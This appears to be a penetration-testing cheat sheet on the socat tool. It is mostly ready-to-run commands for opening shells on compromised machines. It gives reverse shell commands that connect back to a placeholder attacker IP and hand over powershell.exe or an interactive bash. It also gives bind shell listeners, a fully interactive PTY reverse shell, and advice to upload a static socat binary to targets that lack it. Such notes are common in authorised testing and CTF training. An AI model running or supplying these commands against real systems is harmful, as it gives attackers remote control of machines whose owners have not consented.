# socat

Tools

Socat:

Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:

&#x20;      The syntax is more difficult Netcat is installed on virtually every Linux distribution by default.&#x20;

&#x20;      Socat is very rarely installed by default.

syntax for a basic reverse shell listener in socat:

`socat TCP-L:<port> -`

On Windows we would use this command to connect back:

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

Bind Shells

On a Linux target we would use the following command:

```
socat TCP-L:<PORT> EXEC:"bash -li"
```

On a Windows target we would use this command for our listener:

```
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

attacking machine to connect to the waiting listener.

```
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

**-------------------------------A fully stable Linux tty reverse shell------------------------------------------**

listener syntax:

``socat TCP-L:<port> FILE:`tty`,raw,echo=0``

this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true), which can then be executed as normal.

The special command is as follows:

```
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
